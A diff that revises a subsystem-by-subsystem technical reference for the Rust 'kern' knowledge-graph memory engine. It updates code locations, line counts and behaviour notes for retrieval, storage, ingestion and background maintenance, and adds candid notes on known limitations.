@@ -3,7 +3,7 @@
 A full technical scrape of everything that actually exists in the kern source
 today. Organized by subsystem. For each: **what** it does, **how** it works,
 **where** it lives in the code, and **gaps** (known limitations / improvement
-opportunities). Version: `1.1.0`. LoC ~44.7k across 175 `.rs` files.
+opportunities). Version: `1.1.0`. LoC ~41.7k across 152 tracked `.rs` files.
 
 State legend: `active` (runs today), `building` (wired but partial/unverified),
 `off` (present but disabled by default).
@@ -19,7 +19,7 @@ session delta (.txt) ──► intake ──► distill (LLM) ──► typed cl
                                    │            │
                               reason edges    access heat
                                    │            │
-   ┌───────── MCP (stdio+SSE) ────┼──────── RPC (tarpc socket) ────┐
+   ┌───────── MCP (stdio+SSE) ────┼─── RPC (typed local socket) ───┐
    │            ▲                  │                 ▲              │
    │        query pipeline ◄───────┴──────────►  recall            │
    │  (HNSW+BM25 seed → expand → RRF+PageRank → MMR → answer)      │
@@ -52,14 +52,14 @@ everywhere, which is what makes conflict-free cross-node merge work.
   (OR-Set of text lines), two vectors (`vector` content, `gnn_vector` structure),
   and provenance (`Source` with `system`/`object_id`/`section`/`title`/`author`/
   `url`). `kind`/`source` parsed off the source string. Also carries an `acl`
-  (`src/base/types.rs:268`; `Acl { scope, users, groups }` at `:94-99`) — the
+  (`src/base/types.rs:268`; `Acl { scope, users, groups }` at `:95`) — the
   field exists and is persisted, but every writer sets `Acl::default()`
   (`src/ingest/place.rs:56`, `src/ingest/file_watcher.rs:136`) and nothing reads
   it, so it is structure without behavior today.
 - `Reason` (`src/base/types.rs:408`) — an edge `from`→`to` with a `kind`
   (`Similarity`/`Provenance`/`Question`/`Spawn`/`Supersedes`/`Ratification`/
   `Rephrase`, `src/base/types.rs:66`), its own vector (mean of endpoints), a
-  `traversal_count` GCounter (`src/base/types.rs:427`), and a CRDT `score`.
+  `traversal_count` GCounter (`src/base/types.rs:424`), and a CRDT `score`.
   `is_enriched`/`is_remote` flags. There is no `Contradiction` edge kind —
   `Related` is a `ContradictionClass` verdict, not an edge, and a deferred
   contradiction candidate is carried by a `Rephrase` edge.
@@ -71,10 +71,13 @@ everywhere, which is what makes conflict-free cross-node merge work.
 - `GraphGnn` (`src/base/graph.rs:64`) — the whole in-memory forest: `kerns`
   map, `root`, `entity_idx` (HNSW over content vectors), `gnn_entity_idx`
   (HNSW over GNN vectors), `entity_adjacency` (reason-edge incidence),
-  source routing, a `Lamport` clock, a `mutation_epoch`, pending CRDT deltas,
-  and an optional bound `Store` (LMDB) for hot/cold tiers + disk fallback.
+  source routing, a Lamport clock (a plain `AtomicU64` field driven by
+  `bump_lamport`/`observe_lamport`, `src/base/graph.rs:443`/`:450` — there is no
+  `Lamport` type), a `mutation_epoch`, pending CRDT deltas, the bound embedding
+  model name (`set_embed_model`/`embed_model`, `src/base/graph.rs:203`), and an
+  optional bound `Store` (LMDB) for hot/cold tiers + disk fallback.
 
-**Where.** `src/base/types.rs` (916 LoC), `src/base/graph.rs` (1106 LoC),
+**Where.** `src/base/types.rs` (880 LoC), `src/base/graph.rs` (1325 LoC),
 `src/base/reason.rs` (edge add/remove/move), `src/base/search.rs` (graph-wide
 entity/reason lookup + unlocked vector search).
 
@@ -91,10 +94,12 @@ supersedes an existing one. The core write path every ingestion funnels through.
 
 **How** (`src/base/accept.rs:26` `accept()`):
 
-1. **Dedup** — graph-wide top-1 vector search; if `score > INGEST_DEDUP_THRESHOLD`
-   (0.95, `src/base/constants.rs:22`; `DEDUP_EF=64`), the thought is a duplicate and merges into the
-   existing entity (no new node).
-2. **Route** (`route_entity`) — descend from the target kern toward a leaf:
+1. **Dedup** — graph-wide top-1 vector search; if `score >` the preset's dedup
+   threshold (0.98 on the default `relaxed`; 0.95 medium, 0.90 tight,
+   `src/config/preset.rs`; `DEDUP_EF=64`), the thought is a duplicate and merges
+   into the existing entity (no new node).
+2. **Route** (`route_entity`, `src/base/accept.rs:111`) — descend from the
+   target kern toward a leaf:
    - For each loaded child, route into the one whose graviton is nearest by
      effective distance `cosine_distance / mass` (`mass` default `1.0`,
      `1e-6` epsilon floor) — heavier gravitons both attract and retain.
@@ -102,14 +107,14 @@ supersedes an existing one. The core write path every ingestion funnels through.
      `generic` catch-all child (empty graviton vec, never matches on similarity) —
      the root never commits entities itself.
    - At a **named** kern with a graviton: compute `acceptance_probability`
-     (softmax over cosine distance vs `inner`/`outer` radii); below
-     `ACCEPT_FLOOR` (0.5) → spawn an unnamed child and descend.
-   - Max depth 64 to bound a runaway descent.
-3. **Commit** (`commit_entity`) — stamp `root_id`, insert into the
-   `entity_idx`/`gnn_entity_idx`, attach a `Similarity` reason to the nearest
-   existing neighbor and a `Provenance` reason to the source doc.
+     (`src/base/accept.rs:753`, softmax over cosine distance vs `inner`/`outer`
+     radii); below `ACCEPT_FLOOR` (0.5) → spawn an unnamed child and descend.
+   - `MAX_ACCEPT_DEPTH = 64` (`src/base/accept.rs:17`) bounds a runaway descent.
+3. **Commit** (`commit_entity`, `src/base/accept.rs:167`) — stamp `root_id`,
+   insert into the `entity_idx`/`gnn_entity_idx`, attach a `Similarity` reason to
+   the nearest existing neighbor and a `Provenance` reason to the source doc.
 
-**Where.** `src/base/accept.rs` (1259 LoC). Radii defaults in `constants.rs`
+**Where.** `src/base/accept.rs` (1452 LoC). Radii defaults in `constants.rs`
 (`KERN_INNER_RADIUS=0.15`, `KERN_OUTER_RADIUS=0.35`).
 
 **Gaps.** Routing does a vector lookup per level (O(depth·log n)); a cached
@@ -126,23 +131,31 @@ stays as history with a stamped `valid_to`; `query` can recover the past via
 
 **How.**
 
-- `supersede_by_contradiction` (`src/base/accept.rs:400`) — inserts the new
+- `supersede_by_contradiction` (`src/base/accept.rs:470`) — inserts the new
   thought, sets the old `status=Superseded`, `superseded_by=new_id`, and
   `stamp_invalidated(now, new_valid_from)` so the window closes exactly when
   the new claim became true. Removes the old id from both vector indexes (so it
   stops seeding) but keeps it in the kern for history. Adds a `Supersedes`
   reason edge with the averaged vector.
-- Classification is LLM-driven (`classify_prompt` `accept.rs:380` /
-  `parse_contradiction` `accept.rs:390`) and **fails open to `Related`** (co-exist) — the
-  conservative choice that never loses data. Driven from the tick's
-  `do_classify_contradiction` task (`src/tick/tasks.rs:115`) so recall stays
-  LLM-free at query time.
+- Classification is LLM-driven (`classify_prompt` `src/base/accept.rs:450` /
+  `parse_contradiction` `src/base/accept.rs:460`) and **fails open to `Related`**
+  (co-exist) — the conservative choice that never loses data. Driven from the
+  tick's `do_classify_contradiction` task (`src/tick/tasks.rs:114`) so recall
+  stays LLM-free at query time.
 - `is_valid_at(instant)` / `valid_from_or_created()` on `Entity` answer
   point-in-time membership; the query layer's `include_history` walks the
   `superseded_by` chain.
+- The three stamps survive the **cold tier**. A spilled row is a `ColdRow`
+  (`src/base/store.rs:170`) = `Entity` ++ `StoredTemporal`
+  (`src/base/store.rs:141`), written under `FORMAT_V4` and decoded by version,
+  never by parse-sniffing (`decode_cold`, `src/base/store.rs:197`) — a truncated
+  V4 value errors instead of silently degrading to a stampless `Entity`. So a
+  cold-recovered revision keeps `valid_from`/`valid_to`/`invalidated_at` and
+  `is_valid_at` answers over the cold tail exactly as it does over the hot graph.
 
 **Where.** `src/base/accept.rs`, `src/base/types.rs` (temporal helpers),
-`src/tick/tasks.rs` (background classification).
+`src/base/store.rs` (cold-tier round-trip), `src/tick/tasks.rs` (background
+classification).
 
 **Gaps.** Classification runs once per near-duplicate pair on the tick; a
 re-classify when either side changes isn't triggered. No UI/MCP tool exposes
@@ -155,34 +168,44 @@ the history chain directly beyond `include_history`.
 **What.** The hybrid query engine. Hand-rolled end to end (no external ANN or
 rerank lib). This is the product's core IP.
 
-**Stages** (`retrieve_profiled`, `src/retrieval/answer.rs:138`, each checkpoint
+**Stages** (`retrieve_profiled`, `src/retrieval/answer.rs`, each checkpoint
 profiled via `src/profile.rs`):
 
 | # | Stage | File | What happens |
 | --- | ------- | ------ | -------------- |
 | 1 | **Seed dense** | `retrieval/seed.rs` | HNSW top-`k` over a 0.4/0.6 blend of content + GNN vectors (`Weights::for_mode` per `Mode` Hybrid/Vector/Lexical/Reason). Plus `seed_important` — an O(N) scan feeding access/recency (`IMPORTANT_ACCESS_THRESHOLD=3`, `IMPORTANT_MIN_COSINE=0.20`) into both the dense merge and RRF, run once. |
-| 2 | **Seed lexical** | `retrieval/seed.rs:98` | BM25 (`LexicalIndex`) candidate list, fused via RRF when `mode==Hybrid`. |
+| 2 | **Seed lexical** | `retrieval/seed.rs:86` | BM25 (`LexicalIndex`) candidate list, fused via RRF when `mode==Hybrid`. |
 | 3 | **Fuse (RRF)** | `retrieval/fuse.rs` | Reciprocal-rank fusion of dense + lexical + important lists with mode weights. |
 | 4 | **PageRank** | `retrieval/pagerank.rs` | Centrality weighting of the fused seeds over the reason graph. |
 | 5 | **Expand** | `retrieval/expand.rs:178` | Walk reason edges out from seeds (`PathChain` recording the *why*), scoring neighbors (`score_neighbor`). Optional **HyDE** (`retrieval/hyde.rs`) generates a hypothetical answer to broaden recall. |
 | 6 | **Merge** | `retrieval/merge.rs` | Combine seeds + expanded neighbors into `ScoredEntity` list. |
-| 7 | **Boosts** | `retrieval/score.rs:79` | `apply_boosts`: confidence × score + **QBST** access/recency boost (`qbst`, capped at 0.1, 24h half-life) + `fact_score_boost` (0.3) for Facts. |
+| 7 | **Boosts** | `retrieval/score.rs` | `apply_boosts`: confidence × score + **QBST** access/recency boost (`qbst`, capped at 0.1, 24h half-life) + `fact_score_boost` (0.3) for Facts. |
 | 7b | **Gravity** | `retrieval/gravity.rs` | Query-time graviton pull: `score += gravity_weight (0.15) * max_over_gravitons(mass * max(0, cos(entity, graviton_vec)))`. Max, not sum — overlapping gravitons never double-count. `gravity_weight=0` disables (early return, zero cost); no gravitons → no-op. Latency only, from the bench deleted in `8d8b19e` and not reproducible: ~+7% p50 with 5 gravitons. No quality claim accompanies it — the retrieval-quality half of that bench is withdrawn under the claim standard (`ROADMAP.md` — "What measures retrieval quality with no LLM in the scoring loop?"). |
-| 8 | **Filter** | `retrieval/score.rs:93` | Drop superseded; floor at `MIN_DELIVER_SCORE=0.40`; cap at `MAX_DELIVER_RESULTS=10` (MMR keeps a larger pool when on). Apply query options (source/kind/time/min_conf). |
+| 8 | **Filter** | `retrieval/score.rs` | `filter_delivery`: drop superseded; floor at `retrieval.min_deliver_score` (default `0.0` — off); cap at `retrieval.max_deliver_results` (default `25`; MMR keeps a `mmr_pool_size=50` pool when on). Both are config fields (`src/config/retrieval.rs:44-45`), not constants. Query options (source/kind/scheme/time/min_conf) go through `matches_filter` (`retrieval/score.rs`), the single predicate shared with pre-filtered ANN search. |
 | 9 | **Dedup by section** | `retrieval/diversify.rs:6` | Collapse near-duplicate sections. |
 | 10 | **MMR** | `retrieval/diversify.rs:46` | Maximal-marginal-relevance diversification so the `k` results actually differ. |
 | 11 | **Rerank** (opt) | `retrieval/rerank.rs` | LLM reranker reorders the head; `parse_ranking` recovers a permutation. |
-| 12 | **Answer** (opt) | `retrieval/answer.rs:217` | `synthesize` glues top chains + thoughts into an LLM answer prompt (`ANSWER_MAX_CHAINS=5`, `ANSWER_MAX_THOUGHTS=5`). Prompt instructs declining with the exact `NO_ANSWER` string when context lacks the answer; empty context short-circuits to that string with no LLM call. `QueryOptions::answer_style` appends a caller-supplied style hint (eval uses it for short-fact answers; product default none). |
-| 13 | **Cold backfill** | `base/store.rs:515` | If hot returns `< k`, cold-tier hits (brute-force `cold_search`) fill remaining slots, flagged `cold:true`. |
-| 14 | **Query cache** | `retrieval/cache.rs` | LRU keyed on query-vector hash + tag (256 cap, θ=0.97 similarity). `lookup`/`lookup_text`/`insert`. `commit_access` deposits heat on every returned hit. |
+| 12 | **Answer** (opt) | `retrieval/answer.rs` | `synthesize` glues top chains + thoughts into an LLM answer prompt (`ANSWER_MAX_CHAINS=5`, `ANSWER_MAX_THOUGHTS=5`). Prompt instructs declining with the exact `NO_ANSWER` string when context lacks the answer; empty context short-circuits to that string with no LLM call. `QueryOptions::answer_style` appends a caller-supplied style hint (eval uses it for short-fact answers; product default none). |
+| 13 | **Cold backfill** | `src/mcp/tools_query.rs:242` | If hot returns `< k`, cold-tier hits (brute-force `Store::cold_search`, `src/base/store.rs:685`) fill remaining slots, flagged `cold:true`. Skipped on the exact-text fast path, which never embedded a query vector. |
+| 14 | **Query cache** | `retrieval/cache.rs` | LRU keyed on query-vector hash + tag (256 cap, θ=0.97 similarity). `lookup`/`lookup_text`/`insert`. Heat is deposited separately: `score::commit_access` (`retrieval/score.rs`) stamps the delivered hits, and the tick's `CommitAccess` task calls `score::commit_access_ids`. |
 
-**Where.** `src/retrieval/*` (4081 LoC, 13 files). Entry: `retrieval::query`
+**Where.** `src/retrieval/*` (4374 LoC, 12 files). Entry: `retrieval::query`
 (one-shot CLI) and `retrieval::query_locked` (daemon, holds read lock only for
 the graph phase; every LLM call runs unlocked).
 
-**Gaps.** The O(N) importance scan runs every retrieve; at scale it should be
-indexed. RRF weights and mode blends are config but not auto-tuned. No learned
-rerank model — the LLM rerank is a cold call per query.
+**Gaps.**
+
+- **A reason edge changes no ranking.** Measured 2026-07-21 by
+  `e2e/test_invariants.py`: ingest A and B, `kern link` A→B, probe with text
+  matching A only — B's rank and score are identical to four decimals whether or
+  not the edge exists, on all 8 pairs. The edge *is* created and *is* walkable
+  (`kern get` prints it); it does not reach ranking. Recorded as a strict
+  `xfail`, so the day it starts mattering the suite fails loudly
+  (`ROADMAP.md` item 86). Every claim in this repo that multi-hop traversal
+  improves recall is false until that closes.
+- The O(N) importance scan runs every retrieve; at scale it should be indexed.
+- RRF weights and mode blends are config but not auto-tuned.
+- No learned rerank model — the LLM rerank is a cold call per query.
 
 ---
 
@@ -193,17 +216,18 @@ cold backfill.
 
 **How.**
 
-- **HNSW** (`src/base/hnsw.rs`, 1082 LoC) — id-stable, deterministic-build
-  graph ANN. `insert`/`delete`/`search`/`search_batch`/`search_filtered`
-  (pre-filtered ANN that shares one filter predicate with post-filtering).
-  Quantization-aware: stores `QuantizedVec` (int8) when configured. `structure_digest`
-  for parity checks.
-- **DiskANN** (`src/base/diskann.rs`, 620 LoC) — disk-resident graph index.
+- **HNSW** (`src/base/hnsw.rs`, 944 LoC) — id-stable, deterministic-build
+  graph ANN. `insert` (`:140`) / `delete` (`:118`) / `search` (`:222`) /
+  `search_filtered` (`:247`, pre-filtered ANN that shares one filter predicate
+  with post-filtering). Quantization-aware: stores `QuantizedVec` (int8) when
+  configured. `structure_digest` for parity checks.
+- **DiskANN** (`src/base/diskann.rs`, 609 LoC) — disk-resident graph index.
   `build_and_save` (Params `r=32, build_l=64, alpha=1.2`) writes
-  `meta.bin`/`vectors.bin`/`graph.bin`; `DiskIndex::open`/`search`/
-  `search_hits_filtered`. Selected when a kern exceeds `disk_threshold`.
-- **BM25 LexicalIndex** (`src/base/lexical.rs`) — in-RAM inverted index,
-  `k1`/`b` tunable, `rebuild_from_graph`, `search_filtered`.
+  `meta.bin`/`vectors.bin`/`graph.bin`; `DiskIndex::open`/`search` (`:377`) /
+  `search_hits_filtered` (`:392`). Selected when a kern exceeds `disk_threshold`.
+- **BM25 LexicalIndex** (`src/base/lexical.rs:24`) — in-RAM inverted index,
+  `k1`/`b` tunable (`set_bm25_params`), `rebuild_from_graph` (`:117`),
+  `search`/`search_filtered` (`:62`/`:67`).
 - **VectorBackend** (`src/base/vector_backend.rs`) — enum switch
   (`Resident(HnswIndex)` | `Disk(DiskIndex)`) unifying the search API so the
   retrieval layer is backend-agnostic.
@@ -221,14 +245,15 @@ in-graph. DiskANN is build-once; incremental updates funnel through
 **What.** int8 (and float fallback) vector storage + distance, cutting vector
 memory ~4×.
 
-**How.** `QuantizationMode` (`None`/`Int8`/`Binary`, `src/quant.rs:8`; `Binary`
-is implemented and tested but deliberately excluded from `parse`, so it is not
-user-selectable — recall floor is too low without rescore),
-`QuantizedVec::encode`/`decode`, `quantized_cosine_distance` /
-`float_cosine_distance`. `INT8_MAX_ABS=127`. The HNSW index picks the mode at
-build; both resident and disk backends honor it.
+**How.** `QuantizationMode` (`None`/`Int8`/`Binary`, `src/quant.rs:7`; `Binary`
+is implemented and tested but deliberately excluded from `parse` (`src/quant.rs:16`),
+so it is not user-selectable — recall floor is too low without rescore),
+`QuantizedVec::encode`/`decode`, `quantized_cosine_distance` (`src/quant.rs:159`)
+falling back to a private `float_cosine_distance` (`:171`) across mismatched
+modes. `INT8_MAX_ABS=127`. The HNSW index picks the mode at build; both resident
+and disk backends honor it.
 
-**Where.** `src/quant.rs` (485 LoC).
+**Where.** `src/quant.rs` (476 LoC).
 
 **Gaps.** No int4 / product-quantization path. Scale is fixed at encode time.
 
@@ -241,33 +266,64 @@ and cold tier live together. Readers never block, writers serialize.
 
 **How.**
 
-- `Store::open` (`src/base/store.rs:230`) opens the env; `StoredKern`/
-  `StoredVec`/`StoredTemporal` are the on-disk bincode shapes, values
-  `zstd(bincode)`-compressed, vectors int8.
-- **Guarded flush** (`flush_guarded`, `store.rs:411` + `persist.rs:283`) — a
-  snapshot carries an expected `mutation_epoch`; if disk advanced under us
-  (another writer / external edit), the flush is *refused*, the disk rows are
-  *absorbed* back (`merge::absorb_graph`), and the flush retries. Prevents a
-  stale in-memory snapshot from clobbering newer on-disk state.
-- **Cold tier** — `cold_spill`/`cold_get`/`cold_all`/`cold_put_all`/
-  `cold_search` (brute-force). Capped at `COLD_MAX_ENTRIES=50_000` (latest-wins
-  keyed table).
-- **Compaction** (`compact_dir`, `store.rs:568`) — the only way to shrink
-  LMDB's high-water mark; writes a fresh env to a tmp file then `swap_compacted`
-  renames with retry (25 attempts). Requires exclusive access (run offline).
+- `Store::open` (`src/base/store.rs:351`) opens the env (`heed` 0.20);
+  `StoredKern`/`StoredVec`/`StoredTemporal`/`ColdRow` are the on-disk bincode
+  shapes, each value a version byte followed by a `zstd` frame
+  (`encode_at`/`strip_version`, `src/base/store.rs:70`/`:83`), vectors int8.
+  Formats `V1..=V4`; a value carrying a newer byte is rejected, never
+  mis-decoded.
+- **Guarded flush** (`Store::flush_guarded` `src/base/store.rs:594`,
+  `persist::flush_guarded` `src/base/persist.rs:331`) — a snapshot carries an
+  expected `mutation_epoch`; if disk advanced under us (another writer /
+  external edit), the flush is *refused*, the disk rows are *absorbed* back
+  (`merge::absorb_graph`), and the flush retries. Prevents a stale in-memory
+  snapshot from clobbering newer on-disk state.
+- **Embedding stamp.** The store records the model and vector dimension it was
+  built with (`EmbedStamp`, its own meta key so an unstamped store reads as
+  *unknown*, never as a mismatch). `check_embed_stamp` (`src/base/store.rs:473`)
+  runs at open via `persist::check_graph_stamp` (`src/base/persist.rs:295`),
+  wired from `commands::bind_embed_model`: an **unstamped** store adopts the
+  configured model and says so once; a **differing** model or dimension sets a
+  durable `embed_mismatch` flag, logs through a `LogThrottle`, and leaves the
+  stored stamp intact because it still describes what is on disk. An unreadable
+  stamp is treated as unknown, not as unstamped — adopting over it would erase
+  the identity of the stored vectors. `kern reembed` stamps the model it
+  *actually embedded with*, not the configured one
+  (`src/commands/reembed.rs:59`), so `health` can never report a false identity.
+- **Query dimension guard** (`src/base/search.rs:23` `dim_guard`) — `cosine`
+  truncates to the shorter side, so an off-model query vector would score noise
+  and rank it as recall. Every graph vector search checks the query dimension
+  against the indexed one first. Fail-open by design: a rejected query returns
+  no hits rather than panicking, but it is *counted*
+  (`search::query_dim_rejected`, `src/base/search.rs:15`) and logged throttled,
+  because the silent no-op is what let the mismatch hide.
+- **Cold tier** — `cold_spill` (`src/base/store.rs:647`) / `cold_get` /
+  `cold_all` / `cold_put_all` / `cold_search` (`src/base/store.rs:685`,
+  brute-force). Bounded by
+  `COLD_MAX_ENTRIES = 50_000`: `cold_cap` (`src/base/store.rs:712`) deletes the
+  oldest rows past the cap, FIFO by `created_at`. The bound itself is
+  deliberate; what changed is that a drop is no longer silent — every eviction
+  increments `cold_evicted` (`:752`), which `health` reports, and the sweep logs
+  once per pass rather than once per row. A dropped non-durable entity is
+  unrecoverable, so the counter is its only trace.
+- **Compaction** (`compact_dir`, `src/base/store.rs:790`) — the only way to
+  shrink LMDB's high-water mark; writes a fresh env to a tmp file then
+  `swap_compacted` renames with retry. Requires exclusive access (run offline).
 - **Migration** (`src/base/migrate.rs`) — `migrate_dir` is a one-shot idempotent
   import of legacy per-kern bincode shards (`load_legacy_dir` → `save_graph_into`),
   exposed as `kern migrate`. Source shards left in place.
-- **Snapshots** — `snapshot_for_flush` / `FlushSnapshot` capture a consistent
-  point-in-time; the maintenance tick runs a mutation-epoch-gated snapshot so
-  crash loss is bounded to one tick interval.
+- **Snapshots** — `snapshot_for_flush` (`src/base/persist.rs:356`) /
+  `FlushSnapshot` capture a consistent point-in-time; the maintenance tick runs
+  a mutation-epoch-gated snapshot so crash loss is bounded to one tick interval.
 
-**Where.** `src/base/store.rs` (1123 LoC), `src/base/persist.rs` (490 LoC),
-`src/base/migrate.rs`, `src/store.rs` (per-cwd `Registry` of open stores).
+**Where.** `src/base/store.rs` (1611 LoC), `src/base/persist.rs` (565 LoC),
+`src/base/migrate.rs`, `src/base/search.rs` (dimension guard), `src/store.rs`
+(per-cwd `Registry` of open stores).
 
 **Gaps.** Single-writer means CLI commands reading the on-disk graph can race a
 live daemon (documented in README). No WAL beyond LMDB's own. Compaction is
-manual/offline.
+manual/offline. The cold tier is still a hard FIFO bound — the eviction is now
+counted and visible, not prevented, and cold search stays brute-force.
 
 ---
 
@@ -279,23 +335,25 @@ Nothing is lost on an LLM outage — the delta stays queued until it succeeds.
 
 **How.**
 
-- **Intake** (`src/ingest/intake.rs`) — `run()` polls `.kern/intake/`,
-  `extract_claims` distills, `archive`/`finalize` move processed deltas to a
-  `done/` dir, `prune_done` ages them out.
+- **Intake** (`src/ingest/intake.rs`) — `run()` (`:220`) polls `.kern/intake/`,
+  `extract_claims` (`:11`) distills, `archive`/`finalize` (`:49`/`:58`) move
+  processed deltas to a `done/` dir, `prune_done` (`:67`) ages them out.
 - **Distill** (`src/ingest/distill.rs`) — a structured prompt asks the LLM for
-  a JSON array of `{text, kind, valid_from?}` where `kind ∈ {preference,
-  decision, project, fact, code-fact, reference, procedural}` (the 7 seeded
-  descriptors). `Some([])` = nothing worth keeping (archive); `None` = no LLM
+  a JSON array of `{text, kind, valid_from?}` where `kind` is one of the 7
+  built-in claim kinds (`DEFAULT_KINDS`, `src/ingest/distill.rs:9`) or a
+  registered one (`root.claim_kinds`, offered to the LLM by `spawn_intake`'s
+  kinds closure).
+  `Some([])` = nothing worth keeping (archive); `None` = no LLM
   output (transient outage, retry). `parse_claims` is lenient (finds the JSON
   array anywhere in the output).
 - **Worker** (`src/ingest/worker.rs`) — async job queue (`enqueue`/`run`),
   owns the embed + accept path. Defers question/contradiction follow-ups to
   the tick via callback closures (`DeferQuestionsFn`/`DeferContradictionFn`).
 - **Embed** (`src/ingest/embed.rs`) — batches texts to the embedding endpoint.
-- **Dedup** (`src/ingest/dedup.rs`) — `find_duplicate` at
-  `INGEST_DEDUP_THRESHOLD=0.95` (stricter than accept-time), `update_existing_entity`.
+- **Dedup** (`src/ingest/dedup.rs`) — `find_duplicate` at the preset's dedup
+  threshold (0.98 on the default `relaxed`), `update_existing_entity`.
 - **Place / split / direct** — `place.rs` builds chunk `Entity`s
-  (`build_chunk_entity`, `chunk_source_id`), `split.rs` chunks by descriptor
+  (`build_chunk_entity`, `chunk_source_id`), `split.rs` chunks by free-text hint
   (LLM-assisted when given), `direct.rs` handles `.kern/intake/direct/` synchronous
   ingest (`drain_direct_once`).
 - **File watcher sink** (`src/ingest/file_watcher.rs`) — `KernFileWatcherSink`
@@ -303,11 +361,11 @@ Nothing is lost on an LLM outage — the delta stays queued until it succeeds.
 - **Outcome** (`src/ingest/outcome.rs`) — `OutcomeStatus` (`Committed`/`Partial`/`Deduped`/`Failed`, `src/ingest/outcome.rs:2`),
   `FailureReport::document_permanent` for non-retryable errors.
 
-**Where.** `src/ingest/*` (2673 LoC, 12 files). Spawned by `spawn_intake`
-(`src/commands.rs:807`).
+**Where.** `src/ingest/*` (2836 LoC, 12 files). Spawned by `spawn_intake`
+(`src/commands.rs`).
 
-**Gaps.** Distill prompt is one-shot; long deltas may truncate. No per-descriptor
-prompt tuning. Dedup threshold is global, not per-descriptor.
+**Gaps.** Distill prompt is one-shot; long deltas may truncate. No per-kind
+prompt tuning. Dedup threshold is global, not per-kind.
 
 ---
 
@@ -320,48 +378,69 @@ maintains itself.
 **How.**
 
 - **Queue** (`src/tick/queue.rs`) — bounded (`TICK_QUEUE_CAPACITY=512`) mpsc
-  with backpressure, `TaskKind` enum (Cluster/SeedQuestions/
-  ClassifyContradiction/Name/Enrich/ResolveQuestion/Persist/GnnPropagate/
-  StigmergyGc/Reembed/DiskConsolidate/CommitAccess). Records per-task latency
-  and pending/done metrics.
+  with backpressure, `TaskKind` enum (`src/tick/queue.rs:8`: Cluster/Name/
+  Enrich/ResolveQuestion/SeedQuestions/ClassifyContradiction/Persist/
+  GnnPropagate/StigmergyGc/Reembed/DiskConsolidate/IdleSweep/CommitAccess).
+  Records per-task latency, pending/done metrics, and two separate degradation
+  counters: `panics` (a task that died) and `failures` (a task that ended early
+  and re-enqueues forever), each keeping the most recent `TaskFault`
+  (`src/tick/queue.rs:38` — kind, kern, message).
 - **Driver** (`tick::start`, `src/tick.rs:37`) — one async task drains the
-  queue and dispatches via `process_task`. `tick_sync` is the synchronous
-  one-shot variant (used by CLI `--sync`). `enqueue_all` fans a Cluster task
-  out to every non-empty kern.
-- **Maintenance tick** (`spawn_maintenance_tick`, `commands.rs`) — periodic
-  driver at `TICK_INTERVAL_SECS=60` (0 = event-driven only): pulses heat,
-  gates GC/consolidation on clock + interval (`pulse::should_run_gc`/
-  `should_consolidate`), enqueues persist.
+  queue and dispatches via `process_task`. Every task runs inside `run_guarded`
+  (`src/tick.rs:54`), which wraps `process_task` in
+  `catch_unwind(AssertUnwindSafe(…))`: a panicking maintenance task now costs
+  one task, not decay/GC/persist/clustering/idle-sweep for the rest of the
+  process's life. The panic is logged with its kind and kern and recorded via
+  `Queue::record_task_panic`; the loop resumes over state the dead task may have
+  half-written, which is exactly what the error line says (the graph lock does
+  not poison, so `AssertUnwindSafe` is deliberate). A panicking task's duration
+  is *not* fed to `task_avg_ms` — averaging work that never finished would make
+  the metric lie as failures climb. `tick_sync` (`src/tick.rs:301`) is the
+  synchronous one-shot variant; `enqueue_all` (`:292`) fans a Cluster task out
+  to every non-empty kern.
+- **Maintenance tick** (`spawn_maintenance_tick`, `src/commands.rs`) — periodic
+  driver at `TICK_INTERVAL_SECS=60` (0 = event-driven only): pulses heat, gates
+  GC and disk consolidation on clock validity + elapsed interval
+  (`pulse::should_run_gc`, `src/tick/pulse.rs:63`), enqueues persist.
 - **Pulse** (`src/tick/pulse.rs`) — `pulse_with_heat` (`src/tick/pulse.rs:20`) re-deposits heat
   on entities reachable from the root, decaying strength by `PULSE_DECAY=0.5`
   per level; below `PULSE_THRESHOLD=0.05` it stops. Heat itself decays lazily
   by age (`heat::decayed`, half-life based), *not* per tick.
 - **Cluster** (`src/tick/cluster.rs` + `tick::do_cluster`) — `vector_cluster`
-  samples up to `TICK_MAX_CLUSTER_SAMPLE=200` entities, groups them; a cluster
+  (`src/tick/cluster.rs:13`) samples up to `TICK_MAX_CLUSTER_SAMPLE=200`
+  entities and groups them; a cluster
   that is `≥ KERN_MIN_CLUSTER_SIZE=10` and `cohesion ≥ KERN_COHESION_THRESHOLD=0.60`
   and not a core cluster spawns a distinct unnamed child and migrates its
   members. Unnamed kerns never spawn (bounds descent). Empty unnamed children
   are evicted back to the parent each pass.
-- **Name** (`do_name`, `tasks.rs:225`) — LLM names an unnamed kern from its
-  centroid (`cluster::graviton_prompt`) once it crosses the naming thresholds
-  (`cohesion ≥ 0.50`, size ≥ 5).
-- **Enrich** (`do_enrich`, `tasks.rs:304`) — LLM writes the explanatory text
-  for an un-enriched reason edge.
-- **Resolve question** (`do_resolve`, `tasks.rs:372`) — open `Question` edges
-  (`to` empty) get answered by retrieval; if a hit scores above
+- **Name** (`do_name`, `src/tick/tasks.rs:224`) — LLM names an unnamed kern from
+  its centroid (`cluster::graviton_prompt`) once it crosses the naming
+  thresholds (`KERN_NAMING_COHESION_THRESHOLD=0.50`,
+  `KERN_NAMING_MIN_CLUSTER_SIZE=5`).
+- **Enrich** (`do_enrich`, `src/tick/tasks.rs:303`) — LLM writes the explanatory
+  text for an un-enriched reason edge.
+- **Resolve question** (`do_resolve`, `src/tick/tasks.rs:371`) — open `Question`
+  edges (`to` empty) get answered by retrieval; if a hit scores above
   `QUESTION_RESOLVE_THRESHOLD=0.80` the edge is closed.
-- **Seed questions** (`do_seed_questions`, `tasks.rs:42`) — broadcasts open
-  questions to peers (federation).
-- **Commit access** (`do_commit_access`, `tasks.rs:448`) — flushes queued
-  access-count/heat updates.
-- **Persist / reembed / disk consolidate** — `do_persist`, `do_reembed`,
-  `do_disk_consolidate`.
+- **Seed questions** (`do_seed_questions`, `src/tick/tasks.rs:41`) — broadcasts
+  open questions to peers (federation).
+- **Commit access** (`do_commit_access`, `src/tick/tasks.rs:447`) — flushes
+  queued access-count/heat updates.
+- **Idle sweep** (`src/tick/idle.rs`) — graph-global; unloads kerns idle past
+  `tick.kern_idle_timeout_secs`. Residency, not forgetting: an unloaded kern is
+  persisted first and reloads on next access.
+- **Persist / reembed / disk consolidate** — `do_persist`
+  (`src/tick/tasks.rs:459`), `do_reembed` (`src/tick/tasks.rs:490`),
+  `do_disk_consolidate` (`src/tick/tasks.rs:443`).
 
-**Where.** `src/tick/*` (2442 LoC, 6 files) + `src/tick.rs`.
